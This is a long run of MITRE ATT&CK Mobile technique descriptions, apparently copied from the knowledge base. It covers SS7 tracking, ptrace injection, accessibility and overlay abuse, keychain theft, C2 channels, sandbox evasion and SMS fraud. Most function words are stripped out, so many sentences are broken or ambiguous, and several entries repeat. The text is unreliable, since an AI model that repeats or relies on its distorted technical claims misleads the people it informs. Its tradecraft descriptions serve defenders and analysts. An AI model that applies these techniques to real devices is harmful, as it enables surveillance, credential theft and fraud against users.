While supply chain compromise impact component hardware software, attackers gain execution focused malicious additions legitimate software software distribution update channels. Targeting specific desired victim set malicious software distributed broad set consumers additional tactics specific victims.  Popular source projects dependencies applications targeted add malicious code users dependency, widespread usage third-party advertising libraries.(Citation: Grace-Advertisement)(Citation: NowSecure-RemoteCode) Adversaries exploit lack authentication signaling network nodes track track location mobile devices impersonating node.(Citation: Engel-SS7)(Citation: Engel-SS7-2008)(Citation: 3GPP-Security)(Citation: Positive-SS7)(Citation: CSRIC5-WG10-FinalReport) 

 

By providing victim’s MSISDN (phone number) impersonating network internal nodes query subscriber nodes, adversaries data collected hop eventually determine device’s geographical cell nearest cell tower.(Citation: Engel-SS7) Adversaries utilize standard operating APIs collect data permission-backed data stores device, calendar contact list. permissions declared time. Android, included application’s manifest. iOS, included application’s `Info.plist` file.  

 

In cases, user required grant access data store application access. OS versions, vendors introduced additional privacy controls users, ability grant permission application application actively user. 

 

If device jailbroken rooted, adversary access [Protected User Data](https://attack.mitre.org/techniques/T1636) user’s knowledge approval.  Adversaries employ asymmetric encryption algorithm conceal command control traffic, relying inherent protections communication protocol. Asymmetric cryptography, public key cryptography, keypair party: public freely distributed, private distributed. asymmetric algorithms work, sender encrypts data receiver’s public key receiver decrypts data private key. ensures intended recipient read encrypted data. Common public key encryption algorithms include RSA, ElGamal, ECDSA.

For efficiency, protocols (including SSL/TLS) symmetric cryptography connection established, asymmetric cryptography establish transmit key. such, protocols classified [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1521/002). Adversaries attempt listing applications installed device. Adversaries [Software Discovery](https://attack.mitre.org/techniques/T1418) automated discovery shape follow-on behaviors, including infect target attempts specific actions. 

 

Adversaries attempt enumerate applications variety reasons, figuring security measures identify presence target applications.  Adversaries attempt running processes device. gain understanding common software/applications running devices network. Adversaries [Process Discovery](https://attack.mitre.org/techniques/T1424) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions. 

 

Recent Android security enhancements difficult list running processes. Android 7 later, application process list abusing elevated privileges. Android kernel utilizing `hidepid` mount feature. Prior Android 7, applications utilize `ps` command examine `/proc` directory device.(Citation: Android-SELinuxChanges) 

 

In iOS, applications `sysctl` command list running processes. functionality removed iOS versions.  Adversaries utilize standard operating APIs gather log data. Android, accomplished Log Content Provider. iOS standard API access log. 

 

If device jailbroken rooted, adversary access [Call Log](https://attack.mitre.org/techniques/T1636/002) user’s knowledge approval.  Adversaries attempt listing security applications configurations installed device. include mobile security products. Adversaries [Security Software Discovery](https://attack.mitre.org/techniques/T1418/001) automated discovery shape follow-on behaviors, including infect target attempt specific actions.  Adversaries inject malicious code processes ptrace (process trace) calls evade process-based defenses elevate privileges. Ptrace injection method executing arbitrary code address space separate live process.  

Ptrace injection involves attaching modifying running process. ptrace enables debugging process observe control process (and individual thread), including changing memory register values.(Citation: PTRACE man) Ptrace injection commonly performed writing arbitrary code running process `malloc`) invoking memory `PTRACE_SETREGS` set register instruction execute. Ptrace injection `PTRACE_POKETEXT`/`PTRACE_POKEDATA`, data specific address target process's memory current address instruction).(Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018)  

Ptrace injection targeting processes high-privileges, systems non-child processes.(Citation: Linux Inject)  

Running code context process access process's memory, system/network resources, elevated privileges. Execution ptrace injection evade detection security products execution masked legitimate process. Adversaries maliciously modify components victim environment hinder disable defensive mechanisms. involves impairing preventative defenses, anti-virus, detection capabilities defenders audit activity identify malicious behavior. span native defenses supplemental capabilities installed users mobile endpoint administrators. **This technique deprecated. [Input Capture](https://attack.mitre.org/techniques/T1417), [Input Injection](https://attack.mitre.org/techniques/T1516), [Input Prompt](https://attack.mitre.org/techniques/T1411) appropriate.**

A malicious app abuse Android's accessibility features capture sensitive data perform malicious actions.(Citation: Skycure-Accessibility)

Adversaries abuse accessibility features Android emulate user's clicks, steal money user's bank account.(Citation: android-trojan-steals-paypal-2fa)(Citation: banking-trojans-google-play)

Adversaries abuse accessibility features Android devices evade defenses repeatedly clicking "Back" button targeted app manager mobile security app launched, strings suggesting uninstallation detected foreground. effectively prevents malicious application uninstalled.(Citation: android-trojan-steals-paypal-2fa) Adversaries exploit remote services enterprise servers, workstations, resources gain unauthorized access internal systems network. Adversaries exploit remote services advantage mobile device’s access internal enterprise network local connectivity Virtual Private Network (VPN). Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. common goal post-compromise exploitation remote services lateral movement enable access remote system. 

An adversary determine remote vulnerable state, [Network Service Scanning](https://attack.mitre.org/techniques/T1423) Discovery methods. common, vulnerable software deployed network, lack patches vulnerabilities, security software detect remote exploitation. Servers target lateral movement exploitation, endpoint systems risk provide advantage access additional resources.

Depending permissions level vulnerable remote service, adversary achieve [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1404) result lateral movement exploitation well.  Adversaries communicate application layer protocols protocols traffic avoid detection/network filtering blending existing traffic. Commands remote mobile devices, commands, embedded protocol traffic mobile client server. 

Web protocols HTTPS traffic notification services native mobile messaging services Google Cloud Messaging (GCM) newly, Firebase Cloud Messaging (FCM), (GCM/FCM: two-way communication) Apple Push Notification Service (APNS; one-way server-to-device).  notification services leverage HTTP/S respective API commonly abused Android iOS blend routine device traffic difficult enterprises inspect.  Adversaries steal user application access tokens acquiring credentials access remote systems resources. occur social engineering URI hijacking typically requires user action grant access, “Open With” dialogue.  

Application access tokens authorized API requests behalf user commonly access resources cloud-based applications software-as-a-service (SaaS).(Citation: Auth0 - Access Tokens Secure APIs Sept 2019) OAuth commonly implemented framework issue tokens users access systems. application desiring access cloud-based services protected APIs gain entry OAuth 2.0 variety authorization protocols. commonly-used sequence Microsoft's Authorization Code Grant flow.(Citation: Identity Platform Protocols 2019)(Citation: - OAuth Code Authorization flow - June 2019) OAuth access token enables third-party application interact resources user data requested requiring user credentials. Adversaries attempt avoid detection hiding malicious behavior user. this, adversary’s modifications remain installed device longer, allowing adversary continue operate device. 

While accomplished, method device’s sensors. utilizing motion sensors device, accelerometer gyroscope, application detect device interacted with. way, application continue device cease operating user device, hiding malicious activity ongoing. Accessing sensors require permissions user, completely transparent. Adversaries employ detect avoid virtualization analysis environments. include changing behaviors checking presence artifacts indicative virtual machine environment (VME) sandbox. adversary detects VME, alter malware’s behavior disengage victim conceal core functions payload. search VME artifacts dropping payloads. Adversaries learned [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1633) automated discovery shape follow-on behaviors. 

Adversaries methods accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1633) checking artifacts analysis virtualization. Adversaries check legitimate user activity determine analysis environment.  Adversaries collect keychain storage data iOS device acquire credentials. Keychains built-in iOS track users' passwords credentials services features Wi-Fi passwords, websites, secure notes, certificates, private keys, VPN credentials.

On device, keychain database stored application sandboxes prevent unauthorized access raw data. Standard iOS APIs applications access keychain contained database. utilizing privilege escalation exploit existing root access, adversary access entire encrypted database.(Citation: Apple Keychain Services)(Citation: Elcomsoft Decrypt Keychain) versions Android prior 4.1, adversary malicious application holds READ_LOGS permission private keys, passwords, credentials, sensitive data stored device's log. Android 4.1 later, adversary attempt perform operating privilege escalation attack access log. Adversaries abuse command script interpreters execute commands, scripts, binaries. interfaces languages provide interacting systems common feature platforms. systems built-in command-line interface scripting capabilities, example, Android UNIX-like OS includes basic [Unix Shell](https://attack.mitre.org/techniques/T1623/001) accessed Android Debug Bridge (ADB) Java’s `Runtime` package.

Adversaries abuse technologies executing arbitrary commands. Commands scripts embedded [Initial Access](https://attack.mitre.org/tactics/TA0027) payloads delivered victims lure documents secondary payloads downloaded existing C2. Adversaries execute commands interactive terminals/shells.  Adversaries disable security tools avoid potential detection tools activities. form disabling security software, modifying SELinux configuration, methods interfere security tools scanning reporting information. typically abusing device administrator permissions exploits gain root access device modify protected files. Adversaries transfer tools files external compromised device facilitate follow-on actions. Files copied external adversary-controlled command control channel  alternate protocols tool FTP. Adversaries dynamically establish connections command control infrastructure evade common detections remediations. achieved malware shares common algorithm infrastructure adversary receive malware's communications. algorithm dynamically adjust parameters domain name, IP address, port malware command control. mobile device targeted exploitation interface cellular networks radio interfaces.

### Baseband Vulnerability Exploitation

A message radio interface (typically cellular, Bluetooth, GPS, NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) other) mobile device exploit vulnerability code running device(Citation: Register-BaseStation)(Citation: Weinmann-Baseband).

### Malicious SMS Message

An SMS message content designed exploit vulnerabilities SMS parser receiving device(Citation: Forbes-iPhoneSMS). SMS message link malicious content designed exploit device browser. Vulnerable SIM cards remotely exploited reprogrammed SMS messages(Citation: SRLabs-SIMCard). Adversaries attempt listing services running remote hosts, including vulnerable remote software exploitation. Methods acquire include port scans vulnerability scans mobile device. technique advantage mobile device's access internal enterprise network local connectivity Virtual Private Network (VPN). Adversaries attempt avoid detection hiding malicious behavior user. this, adversary’s modifications remain installed device longer, allowing adversary continue operate device. 

While accomplished, method device’s sensors. utilizing motion sensors device, accelerometer gyroscope, application detect device interacted with. way, application continue device cease operating user device, hiding malicious activity ongoing. Accessing sensors require permissions user, completely transparent. Adversaries steal data exfiltrating existing command control channel. Stolen data encoded normal communications channel protocol command control communications. Adversaries exploit software vulnerabilities elevate privileges. Exploitation software vulnerability occurs adversary takes advantage programming error application, service, operating software, kernel execute adversary-controlled code. Security constructions, permission levels, hinder access techniques. Adversaries perform privilege escalation include software exploitation circumvent restrictions. 

When initially gaining access device, adversary operating privileged process prevent accessing resources system. Vulnerabilities exist, operating components applications running permissions, exploited gain levels access system. enable unprivileged user- level permission root permissions depending component vulnerable.  Adversaries make, forward, block phone calls user authorization. adversary goals audio surveillance, blocking forwarding calls device owner, C2 communication.

Several permissions programmatically control phone calls, including:

* `ANSWER_PHONE_CALLS` - application answer incoming phone calls(Citation: Android Permissions)
* `CALL_PHONE` - application initiate phone Dialer interface(Citation: Android Permissions)
* `PROCESS_OUTGOING_CALLS` - application dialed outgoing option redirect abort altogether(Citation: Android Permissions)
* `MANAGE_OWN_CALLS` - calling application manages calls self-managed `ConnectionService` APIs(Citation: Android Permissions)
* `BIND_TELECOM_CONNECTION_SERVICE` - Required permission `ConnectionService`(Citation: Android Permissions)
* `WRITE_CALL_LOG` - application write device log, hide malicious phone calls(Citation: Android Permissions)

When granted permissions, application phone dialer first. However, application desires simply redirect user dialer phone filled in, launch Intent `Intent.ACTION_DIAL`, requires specific permissions. requires user explicitly initiate form [Input Injection](https://attack.mitre.org/techniques/T1516) programmatically initiate it. Adversaries steal data exfiltrating un-encrypted network protocol existing command control channel. data alternate network location main command control server.

Adversaries opt obfuscate data, encryption, network protocols natively unencrypted (such HTTP, FTP, DNS). Adversaries employ custom publicly encoding/compression algorithms (such base64) embed data protocol headers fields. Adversaries establish persistence mechanisms trigger execution based specific events. Mobile operating systems subscribe events receiving SMS message, device boot completion, device activities. 

An intent message passed Android applications components. Applications register receive broadcast intents runtime, system-wide intents delivered app events happen device, network user unlocking screen. Malicious applications trigger actions app based broadcast intent received. 

In addition Android intents, malicious applications register intents broadcasted applications. malware respond based actions applications. behavior typically intimate knowledge, targeting specific devices, users, applications. 

In Android 8 (API level 26), broadcast intent behavior changed, limiting implicit intents applications register manifest. cases, applications register manifest receive broadcasts. Now, applications register context-specific broadcast receivers user actively app.(Citation: Android Broadcasts)  Adversaries communicate commonly port bypass firewalls network detection systems blend normal network activity avoid detailed inspection. 

They commonly ports as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They protocol port completely protocol. network traffic mobile device remote servers unencrypted encrypted insecure manner, adversary positioned network eavesdrop communication.(Citation: mHealth) Adversaries collect data notifications operating applications. Notifications sensitive data one-time authentication codes SMS, email, mediums. Credential Access, adversaries attempt intercept one-time code device. Adversaries dismiss notifications prevent user noticing notification arrived trigger action buttons contained notifications.(Citation: ESET 2FA Bypass)  adversary capture network traffic device credentials sensitive data, redirect network traffic flow adversary-controlled gateway same.

A malicious app register VPN client Android iOS gain access network packets. However, platforms, user grant consent app VPN client, iOS app requires special entitlement granted Apple.

Alternatively, malicious app escalate operating privileges, privileges gain access network traffic.

An adversary redirect network traffic adversary-controlled gateway establishing VPN connection manipulating device's proxy settings. example, Skycure (Citation: Skycure-Profiles) describes ability redirect network traffic installing malicious iOS Configuration Profile.

If applications encrypt network traffic, sensitive data accessible adversary, depending capture. operating installed applications legitimate prompt user sensitive account credentials, bank account information, Personally Identifiable (PII). Adversaries mimic functionality prompt users sensitive information.

Compared traditional PCs, constrained display size mobile devices impair ability provide users contextual information, users susceptible technique’s use.(Citation: Felt-PhishingOnMobileDevices)

Specific approaches technique include:

### Impersonate identity legitimate application

A malicious application impersonate identity legitimate application (e.g. application icon) installed device. malicious app prompt user sensitive information.(Citation: eset-finance)

### Display prompt running legitimate application

A malicious application display prompt running legitimate application trick users entering sensitive malicious application legitimate application. Typically, malicious application targeted application (and individual activity targeted application) running foreground, malicious application display prompt. Android 5.0 5.1.1, respectively, increased difficulty determining current foreground application modifications `ActivityManager` API.(Citation: Android-getRunningTasks)(Citation: StackOverflow-getRunningAppProcesses). malicious application abuse Android’s accessibility features determine application foreground.(Citation: ThreatFabric Cerberus) Approaches display prompt include:

* malicious application start activity running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android restrictions ability application start activity application, difficult adversaries utilize technique.(Citation: Android Background)
* malicious application create application overlay window running legitimate application. Applications hold `SYSTEM_ALERT_WINDOW` permission create overlay windows. permission handled typical Android permissions, conditions automatically granted applications installed Google Play Store.(Citation: Cloak Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) `SYSTEM_ALERT_WINDOW` permission ability create application overlay windows expected deprecated future release Android favor API.(Citation: XDA Bubbles)

### Fake device notifications

A malicious application send fake device notifications user. Clicking device notification trigger malicious application display input prompt.(Citation: IB Gustuff Mar 2019) Adversaries steal data exfiltrating protocol existing command control channel. data alternate network location main command control server. 

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, network protocol main command control channel. protocol channels include services cloud storage. Adversaries opt encrypt obfuscate alternate channels.  Adversaries scripts automatically executed boot logon initialization establish persistence. Initialization scripts underlying operating accessible user device rooted jailbroken.  Adversaries execution guardrails constrain execution actions based adversary supplied environment specific conditions expected target. Guardrails ensure payload executes intended target reduces collateral damage adversary’s campaign. Values adversary provide target environment guardrails include environment location.(Citation: SWB Exodus March 2019)

Guardrails prevent exposure capabilities environments intended compromised operated within. guardrails distinct typical [System Checks](https://attack.mitre.org/techniques/T1633/001). [System Checks](https://attack.mitre.org/techniques/T1633/001) involve checking sandbox values continuing execution match, guardrails involve checking expected target-specific continuing execution match. Adversaries mimic common operating GUI components prompt users sensitive seemingly legitimate prompt. operating installed applications legitimate prompt user sensitive account credentials, bank account information, Personally Identifiable (PII). Compared traditional PCs, constrained display size mobile devices impair ability provide users contextual information, users susceptible technique’s use.(Citation: Felt-PhishingOnMobileDevices)

There approaches adversaries mimic functionality. Adversaries impersonate identity legitimate application (e.g. application icon) and, installed device, prompt user sensitive information.(Citation: eset-finance) Adversaries send fake device notifications user trigger display input prompt clicked.(Citation: IB Gustuff Mar 2019) 

Additionally, adversaries display prompt running, legitimate application trick users entering sensitive malicious application legitimate application. Typically, adversaries targeted application individual activity targeted application running foreground display prompt proper time. Adversaries abuse Android’s accessibility features determine application foreground.(Citation: ThreatFabric Cerberus) approaches displaying prompt include:

* Adversaries start activity running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android restrictions ability application start activity application, difficult adversaries utilize technique.(Citation: Android Background)
* Adversaries create application overlay window running legitimate application. Applications hold `SYSTEM_ALERT_WINDOW` permission create overlay windows. permission handled typical Android permissions and, conditions, automatically granted applications installed Google Play Store.(Citation: Cloak Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) `SYSTEM_ALERT_WINDOW` permission ability create application overlay windows expected deprecated future release Android favor API.(Citation: XDA Bubbles) adversary standard operating APIs malicious application gather contact list (i.e., address book) data, escalated privileges access files contact list data. Adversaries modify software binaries establish persistent access devices. software binaries underlying operating users adb terminal emulators. 

Adversaries modifications client software binaries carry malicious tasks binaries executed. example, malware pre-compiled malicious binary intended overwrite genuine device. binaries routinely executed user, adversary leverage persistent access device.  Adversaries perform software packing conceal code. Software packing method compressing encrypting executable. Packing executable file signature attempt avoid signature-based detection. decompression techniques decompress executable code memory. 

Utilities perform software packing called packers. packer FTT. comprehensive list packers available, adversaries create packing techniques leave artifacts well-known packers evade defenses. adversary exploit signaling vulnerabilities track location mobile devices. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport) Adversaries Android’s Native Development Kit (NDK) write native functions achieve execution binaries functions. calls traditional desktop operating system, native code achieves execution level normal Android SDK calls.

The NDK developers write native code C++ compiled machine code, avoiding intermediate languages steps compilation level languages, Java, typically have. Java Native Interface (JNI) component Java functions Android app functions native library.(Citation: Google NDK Started)

Adversaries choose native functions execute malicious code native actions typically difficult analyze standard, non-native behaviors.(Citation: MITRE App Vetting Effectiveness) Malicious applications common attack vector adversaries gain presence mobile devices. technique describes installing malicious application targeted mobile devices involving authorized app store Google Play Store Apple App Store). Adversaries avoid placing malicious applications authorized app store increased potential risk detection reasons. However, mobile devices configured application installation authorized app store prevent technique working.

Delivery methods malicious application include:

* [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) - Including mobile app package attachment email message.
* [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) - Including link mobile app package email, message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), site, QR code, means.
* Third-Party App Store - Installed third-party app store (as opposed authorized app store device implicitly trusts default behavior), apply level scrutiny apps applied authorized app store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: TrendMicro-FlappyBird)

Some Android malware functionality install additional applications, automatically adversary instructs to.(Citation: android-trojan-steals-paypal-2fa) adversary unauthorized access misuse authorized access cloud services (e.g. Google's Android Device Manager Apple iCloud's iPhone) EMM console access wipe enrolled devices (Citation: Honan-Hacking). Adversaries compromised device proxy server Internet. utilizing proxy, adversaries hide true IP address C2 server infrastructure destination network traffic. masquerades adversary’s traffic legitimate traffic originating compromised device, evade IP-based restrictions alerts services, bank accounts social media websites.(Citation: Threat Fabric Exobot)

The common type proxy SOCKS proxy. typically implemented standard OS-level APIs 3rd party libraries indication user. Android, adversaries `Proxy` API programmatically establish SOCKS proxy connection, lower-level APIs interact raw sockets. Adversaries [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1520) (DGAs) procedurally generate domain names command control communication, malicious application distribution.(Citation: securelist rotexy 2018)

DGAs increase difficulty defenders block, track, command control channel, thousands domains malware check instructions. adversary standard operating APIs malicious application gather calendar entry data, escalated privileges access files calendar data. adversary set unauthorized Wi-Fi access compromise existing access and, device connects them, carry network-based attacks eavesdropping modifying network communication(Citation: NIST-SP800153)(Citation: Kaspersky-DarkHotel). Adversaries abuse Android's `startForeground()` API method maintain continuous sensor access. Android 9, idle applications running background access device sensors, camera, microphone, gyroscope.(Citation: Android-SensorsOverview) Applications retain sensor access running foreground, Android’s `startForeground()` API method. informs user actively interacting application, killed. requirement start foreground service persistent notification user.(Citation: Android-ForegroundServices)

Malicious applications abuse `startForeground()` API method continue running foreground, notification user pretending genuine application. unhindered access device’s sensors, assuming permission granted.(Citation: BlackHat Sutter Android Foreground 2019)

Malicious applications abuse `startForeground()` API inform Android user actively interacting application, preventing killed memory killer.(Citation: TrendMicro-Yellow Camera) Adversaries devices exploiting copying malware devices connected USB. Lateral Movement, adversaries utilize physical connection device compromised malicious charging station PC bypass application store requirements install malicious applications directly.(Citation: Lau-Mactans) Initial Access, adversaries attempt exploit device connection gain access data stored device.(Citation: Krebs-JuiceJacking) Examples include: 
 
* Exploiting insecure bootloaders Nexus 6 6P device USB gaining ability perform actions including intercepting phone calls, intercepting network traffic, obtaining device physical location.(Citation: IBM-NexusUSB) 
* Exploiting weakly-enforced security boundaries Android devices Google Pixel 2 USB.(Citation: GoogleProjectZero-OATmeal) 
* Products Cellebrite Grayshift purportedly exploit iOS devices physical access data port unlock passcode.(Citation: Computerworld-iPhoneCracking)  Adversaries capture audio collect leveraging standard operating APIs mobile device. Examples audio adversaries target include user conversations, surroundings, phone calls, sensitive information. 

 

Android iOS, default, require applications request device microphone access user.  

 

On Android devices, applications hold `RECORD_AUDIO` permission access microphone `CAPTURE_AUDIO_OUTPUT` permission access audio output. Android third-party applications hold `CAPTURE_AUDIO_OUTPUT` permission default, privileged applications, distributed Google device vendor, access audio output.(Citation: Android Permissions) However, adversaries gain access elevating privileges. `CAPTURE_AUDIO_OUTPUT` permission, adversaries pass `MediaRecorder.AudioSource.VOICE_CALL` constant `MediaRecorder.setAudioOutput`, allowing capture voice uplink downlink.(Citation: Manifest.permission) 

 

On iOS devices, applications include `NSMicrophoneUsageDescription` key `Info.plist` file access microphone.(Citation: Requesting Auth-Media Capture) Adversaries execute malicious payloads hijacking operating systems applications. Hijacking execution flow purposes persistence hijacked execution reoccur time. 

There adversary hijack flow execution. primary manipulating operating locates programs executed. operating locates libraries program intercepted. Locations operating programs resources, file directories, poisoned include malicious payloads. Adversaries abuse Unix commands scripts execution. Unix shells underlying command prompts Android iOS devices. Unix shells control aspect system, commands requiring elevated privileges accessible device rooted jailbroken. 

Unix shells support scripts enable sequential execution commands typical programming operations conditionals loops. Common scripts include repetitive tasks, set commands multiple systems. 

Adversaries abuse Unix shells execute commands payloads. Interactive shells accessed command control channels lateral movement SSH. Adversaries leverage scripts deliver execute multiple commands victims payloads persistence. 

If device rooted jailbroken, adversaries locate invoke superuser binary elevate privileges interact root user. dangerous level permissions adversary special commands modify protected files.   Adversaries communicate application layer protocols avoid detection/network filtering blending existing traffic. Commands mobile device, commands, embedded protocol traffic mobile device server. 

Adversaries utilize protocols, including browsing, transferring files, electronic mail, DNS. Adversaries download execute dynamic code included original application package installation. technique evade static analysis checks pre-publication scans official app stores. cases, advanced dynamic behavioral analysis techniques detect behavior. However, conjunction [Execution Guardrails](https://attack.mitre.org/techniques/T1627) techniques, detecting malicious code downloaded installation difficult.

On Android, dynamic code include native code, Dalvik code, JavaScript code utilizes Android WebView’s `JavascriptInterface` capability. 

On iOS, dynamic code downloaded executed 3rd party libraries JSPatch. (Citation: FireEye-JSPatch)  adversary unauthorized access misuse authorized access cloud services (e.g. Google's Android Device Manager Apple iCloud's iPhone) enterprise mobility management (EMM) / mobile device management (MDM) server console access track mobile devices.(Citation: Krebs-Location) Adversaries employ checks detect avoid virtualization analysis environments. include changing behavior checking presence artifacts indicative virtual environment sandbox. adversary detects virtual environment, alter malware’s behavior disengage victim conceal core functions implant. search virtualization artifacts dropping secondary additional payloads. 

Checks include generic properties host/domain samples network traffic. Adversaries check network adapters addresses, CPU core count, memory/drive size. 

Hardware checks, presence motion sensors, gather evidence indicative virtual environment. Adversaries query specific readings devices.  Adversaries access collect application data resident device. Adversaries target popular applications, Facebook, WeChat, Gmail.(Citation: SWB Exodus March 2019) 

 

Due mobile OS sandboxing, technique scenarios: 

 

* application stores files unprotected external storage 
* application stores files internal storage directory insecure permissions (e.g. 777) 
* adversary gains root permissions device  Adversaries screen capture collect additional target device, applications running foreground, user data, credentials, sensitive information. Applications running background capture screenshots videos application running foreground Android `MediaProjectionManager` (generally requires device user grant consent).(Citation: Fortinet screencap July 2019)(Citation: Android ScreenCap1 2019) Background applications Android accessibility services capture screen contents displayed foreground application.(Citation: Lookout-Monokle) adversary root access Android Debug Bridge (adb) access Android `screencap` `screenrecord` commands.(Citation: Android ScreenCap2 2019)(Citation: Trend Micro ScreenCap July 2015)  Adversaries alter data en route storage systems manipulate external outcomes hide activity. manipulating transmitted data, adversaries attempt affect business process, organizational understanding, decision making.

Manipulation network connection processes opportunity deploy tool intercept change information. type modification impact depends target transmission mechanism goals objectives adversary. complex systems, adversary special expertise access specialized software system, typically gained prolonged gathering campaign, desired impact.

One method achieve [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) modifying contents device clipboard. Malicious applications monitor clipboard activity `ClipboardManager.OnPrimaryClipChangedListener` interface Android determine clipboard contents changed. Listening clipboard activity, reading clipboard contents, modifying clipboard contents requires explicit application permissions performed applications running background. However, behavior changed release Android 10.

Adversaries [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) replace prior pasted. example, replacing copied Bitcoin wallet address wallet address adversarial control.

[Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) Android/Clipper.C trojan. sample detected ESET application distributed Google Play Store targeting cryptocurrency wallet numbers.(Citation: ESET Clipboard Modification February 2019) adversary access compromised device's credentials attempt manipulate app store rankings ratings triggering application downloads posting fake reviews applications. technique requires privileged access (a rooted jailbroken device). Adversaries register Uniform Resource Identifiers (URIs) intercept sensitive data.

Applications regularly register URIs operating response handler actions, logging app external account single sign-on. redirections specific URI intercepted application. malicious application register URI genuine application, malicious application intercept data intended genuine application perform phishing attack genuine application. Intercepted data include OAuth authorization codes tokens malicious application gain access resources.(Citation: Trend Micro iOS URL Hijacking)(Citation: IETF-PKCE) Adversaries manipulate products product delivery mechanisms prior receipt final consumer purpose data compromise. Applications depend external software function properly. Popular source projects dependencies applications targeted add malicious code users dependency.(Citation: Grace-Advertisement) Malicious applications attempt detect operating environment prior executing payloads. checks ensure application running analysis environment sandbox application vetting, security research, reverse engineering. 
Adversaries checks physical sensors, location, properties fingerprint emulators sandbox environments.(Citation: Talos Gustuff Apr 2019)(Citation: ThreatFabric Cerberus)(Citation: Xiao-ZergHelper)(Citation: Cyberscoop Evade Analysis January 2019) Adversaries access `android.os.SystemProperties` Java reflection specific information.(Citation: Github Anti-emulator) Standard values phone number, IMEI, IMSI, device IDs, device drivers checked default signatures common sandboxes.(Citation: Sophos Anti-emulation)
 Adversaries register Uniform Resource Identifiers (URIs) intercept sensitive data. 

Applications regularly register URIs operating response handler actions, logging app external account single sign-on. redirections specific URI intercepted application. adversary register URI genuine application, adversary intercept data intended genuine application perform phishing attack genuine application. Intercepted data include OAuth authorization codes tokens adversary gain access protected resources.(Citation: Trend Micro iOS URL Hijacking)(Citation: IETF-PKCE)  Adversaries undermine security controls warn users untrusted activity prevent execution untrusted applications. Operating systems security products mechanisms identify programs websites possessing level trust. Examples features include: app allowed signed valid code signing certificate; OS prompt alerting user app untrusted source; indication connect untrusted site. method adversaries depend specific mechanism seek subvert.  Android, adversary standard operating APIs malicious application gather log data, escalated privileges access files log data.

On iOS, applications access log, privilege escalation required access data. Adversaries device’s geographical location limit malicious behaviors. example, malware operators limit distribution stage payload geographic regions.(Citation: Lookout eSurv)

[Geofencing](https://attack.mitre.org/techniques/T1581) accomplished persuading user grant application permission access location services. application collect, process, exfiltrate device’s location perform location-based actions, ceasing malicious behavior region-specific advertisements.

One method accomplish [Geofencing](https://attack.mitre.org/techniques/T1581) Android built-in Geofencing API automatically trigger behaviors device enters exits radius geographical location. [Geofencing](https://attack.mitre.org/techniques/T1581) methods, requires user granted `ACCESS_FINE_LOCATION` `ACCESS_BACKGROUND_LOCATION` permissions. required application targets Android (API level 29) higher. However, Android 11 introduced additional permission controls restrict background location collection based user permission choices runtime. additional controls include “Allow app”, effectively prohibit background location collection.(Citation: Android Geofencing API)

Similarly, iOS, developers built-in APIs setup execute geofencing. Depending case, app `requestWhenInUseAuthorization()` `requestAlwaysAuthorization()`, depending access location services required. Android, users option limit application access device’s location, including one-time application running foreground.(Citation: Apple Location Services)

[Geofencing](https://attack.mitre.org/techniques/T1581) prevent exposure capabilities environments intended compromised operated within. example, location data limit malware spread capabilities, evade application analysis environments (ex: malware analysis target geographic area). malicious usages include language-specific [Input Prompt](https://attack.mitre.org/techniques/T1411)s advertisements. Adversaries request device administrator permissions perform malicious actions.

By abusing device administration API, adversaries perform nefarious actions, resetting device’s password [Device Lockout](https://attack.mitre.org/techniques/T1446), factory resetting device [Delete Device Data](https://attack.mitre.org/techniques/T1447) traces malware, disabling device’s cameras, difficult uninstall app.(Citation: Android DeviceAdminInfo)

Device administrators approved user runtime, popup actions requested app. conjunction techniques, [Input Injection](https://attack.mitre.org/techniques/T1516), app programmatically grant administrator permissions user input. Adversaries collect keychain data iOS device acquire credentials. Keychains built-in iOS track users' passwords credentials services features Wi-Fi passwords, websites, secure notes, certificates, private keys, VPN credentials. 

On device, keychain database stored application sandboxes prevent unauthorized access raw data. Standard iOS APIs applications access keychain contained database. utilizing privilege escalation exploit existing root access, adversaries access entire encrypted database.(Citation: Apple Keychain Services)(Citation: Elcomsoft Decrypt Keychain)  ART (the Android Runtime) compiles optimized code device improve performance. adversary escalated privileges modify cached code hide malicious behavior. code compiled device, receive level integrity checks code running partition.(Citation: Sabanal-ART) Android, device type accessible apps android.os.Build class (Citation: Android-Build). Device target privilege escalation exploits. Adversaries include functionality malware uninstalls malicious application device. achieved by:

* Abusing device owner permissions perform silent uninstallation device owner API calls.
* Abusing root permissions delete files filesystem.
* Abusing accessibility service. requires intent request uninstallation, abusing accessibility service proper screen confirm uninstallation. Adversaries wipe device delete individual files manipulate external outcomes hide activity. application administrator access wipe device, individual files require special permissions delete depending storage location. (Citation: Android DevicePolicyManager 2019)

Stored data include variety file formats, Office files, databases, stored emails, custom file formats. impact file deletion depends type data goals objectives adversary, include deleting update files evade detection deleting attacker-specified files impact. malicious app trigger fraudulent charges victim’s carrier billing statement ways, including SMS toll fraud SMS shortcodes purchases.

Performing SMS fraud relies heavily that, SMS purchases, carriers perform device verification user verification. adversaries purchases behalf user, user interaction.(Citation: Google Bread)

